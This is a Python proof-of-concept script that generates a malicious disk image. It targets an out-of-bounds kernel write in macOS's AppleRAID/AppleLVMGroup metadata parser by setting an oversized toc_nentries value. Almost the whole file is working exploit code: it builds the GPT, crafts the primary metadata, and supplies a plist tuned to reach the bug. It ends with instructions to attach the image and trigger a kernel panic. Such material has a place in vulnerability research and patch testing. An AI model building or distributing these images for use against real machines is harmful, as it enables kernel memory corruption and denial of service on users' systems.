#!/usr/bin/env python3
# build_applelvm_poc.py — AppleLVMGroup::readPrimaryMetaData toc_nentries OOB kernel write.
# GPT image, one AppleRAID-GUID partition (0x8000), member header @+0x7000 (AppleRAIDHeader +
# plist LVG), primary metadata @+0x1000 (AppleRAIDPrimary, toc_nentries=61) -> in-place
# endian-swap loop writes index 60 at 0x2040/0x2050 = past the 0x2000 primary buffer.
# macOS 27 26A5353q com.apple.driver.AppleRAID. Codex fleet corestorage_recipe.
import struct, uuid, zlib, os

SECT=512
PART_FIRST_LBA=40
PART_BYTES=0x8000
PART_SECTORS=PART_BYTES//SECT          # 64
PART_LAST_LBA=PART_FIRST_LBA+PART_SECTORS-1
IMG_SECTORS=PART_LAST_LBA+34+1
IMG=bytearray(IMG_SECTORS*SECT)
OUT=os.path.expanduser(os.environ.get("LVM_OUT","~/applelvm_poc.img"))

RAID_TYPE="52414944-0000-11AA-AA11-00306543ECAC"
DISK_GUID="11111111-2222-3333-4444-555555555555"
PART_GUID="aaaaaaaa-bbbb-cccc-dddd-eeeeeeee0001"

def le_guid(s): return uuid.UUID(s).bytes_le
def name72(s):
    r=s.encode("utf-16-le"); return r+b"\x00"*(72-len(r))
def gpt_entry(tg,ug,first,last,nm):
    return le_guid(tg)+le_guid(ug)+struct.pack("<QQQ",first,last,0)+name72(nm)
def gpt_header(cur,bak,entries_lba,entry_crc,first_usable,last_usable):
    h=bytearray(SECT)
    struct.pack_into("<8sIIIIQQQQ16sQIII",h,0,b"EFI PART",0x00010000,92,0,0,
        cur,bak,first_usable,last_usable,le_guid(DISK_GUID),entries_lba,128,128,entry_crc)
    struct.pack_into("<I",h,16,zlib.crc32(h[:92])&0xffffffff)
    return bytes(h)

# protective MBR
struct.pack_into("<B3sB3sII",IMG,0x1BE,0,b"\x00\x02\x00",0xEE,b"\xFF\xFF\xFF",1,min(IMG_SECTORS-1,0xFFFFFFFF))
IMG[0x1FE:0x200]=b"\x55\xAA"
# partition entries
entries=bytearray(128*128)
entries[0:128]=gpt_entry(RAID_TYPE,PART_GUID,PART_FIRST_LBA,PART_LAST_LBA,"AppleRAID")
ecrc=zlib.crc32(entries)&0xffffffff
first_usable=34; last_usable=IMG_SECTORS-34
IMG[1*SECT:2*SECT]=gpt_header(1,IMG_SECTORS-1,2,ecrc,first_usable,last_usable)
IMG[2*SECT:2*SECT+len(entries)]=entries
bentries_lba=IMG_SECTORS-1-32
IMG[bentries_lba*SECT:bentries_lba*SECT+len(entries)]=entries
IMG[(IMG_SECTORS-1)*SECT:IMG_SECTORS*SECT]=gpt_header(IMG_SECTORS-1,1,bentries_lba,ecrc,first_usable,last_usable)

pbase=PART_FIRST_LBA*SECT               # partition byte offset in image

# --- primary metadata @ partition+0x1000 ---
prim=pbase+0x1000
IMG[prim:prim+16]=b"AppleRAIDPrimary"
struct.pack_into(">Q",IMG,prim+0x20,0)
struct.pack_into(">Q",IMG,prim+0x28,0x2000)
struct.pack_into(">I",IMG,prim+0x30,0)
struct.pack_into(">I",IMG,prim+0x34,0)
# toc_nentries: 61 = first OOB at 0x2040 (same 16KB page, silent). Huge value marches the
# in-place byte-swap loop (stride 0x80) far past the 0x2000 IOBufferMemoryDescriptor into
# unmapped pages -> kernel data-abort panic (gzalloc-independent). 0x40000 -> ~32MB march.
TOC=int(os.environ.get("LVM_TOC","0x40000"),0)
struct.pack_into(">Q",IMG,prim+0x38,TOC)

# --- member header @ partition+0x7000 ---
hdr=pbase+0x7000
IMG[hdr:hdr+16]=b"AppleRAIDHeader\x00"
struct.pack_into(">Q",IMG,hdr+0x90,0x1000)  # primary metadata offset = 0x1000
# Complete one-member LVG plist per applelvm_primary_layout lane (the missing coherence
# keys appleraid-MemberCount/ChunkSize/ChunkCount/HeaderVersion/MetaData1Used are why the
# old PoC got createLVG==NULL -> "unknown raid level LVG"). MetaData1Used=8192 sizes the
# IOBufferMemoryDescriptor backing to round_up(8192,0x1000)=0x2000 (gzalloc 8000-9000 brackets).
plist=('<?xml version="1.0" encoding="UTF-8"?>\n'
 '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
 '<plist version="1.0"><dict>'
 '<key>AppleRAID-LevelName</key><string>LVG</string>'
 '<key>AppleRAID-HeaderVersion</key><integer>2</integer>'
 '<key>AppleRAID-SetName</key><string>x</string>'
 '<key>AppleRAID-SetUUID</key><string>11111111-1111-1111-1111-111111111111</string>'
 '<key>AppleRAID-MemberUUID</key><string>22222222-2222-2222-2222-222222222222</string>'
 '<key>AppleRAID-MemberIndex</key><integer>0</integer>'
 '<key>AppleRAID-MemberType</key><string>AppleRAID-Members</string>'
 '<key>AppleRAID-Members</key><array><string>22222222-2222-2222-2222-222222222222</string></array>'
 '<key>appleraid-MemberCount</key><integer>1</integer>'
 '<key>AppleRAID-SequenceNumber</key><integer>1</integer>'
 '<key>AppleRAID-ChunkSize</key><integer>4096</integer>'
 '<key>AppleRAID-ChunkCount</key><integer>1</integer>'
 '<key>AppleRAID-MetaData1Used</key><integer>8192</integer>'
 '<key>AppleRAID-MetaData2Size</key><integer>0</integer>'
 '</dict></plist>\x00').encode()
IMG[hdr+0x98:hdr+0x98+len(plist)]=plist

open(OUT,"wb").write(IMG)
print(f"[*] wrote {OUT} ({len(IMG)} bytes); part LBA {PART_FIRST_LBA}..{PART_LAST_LBA} (AppleRAID GUID)")
print(f"    primary@img0x{prim:x} (toc_nentries=61), member hdr@img0x{hdr:x}")
print("[*] TEST in VM under gzalloc(8000-9000): hdiutil attach applelvm_poc.img -> AppleLVMGroup::readPrimaryMetaData OOB write panic")
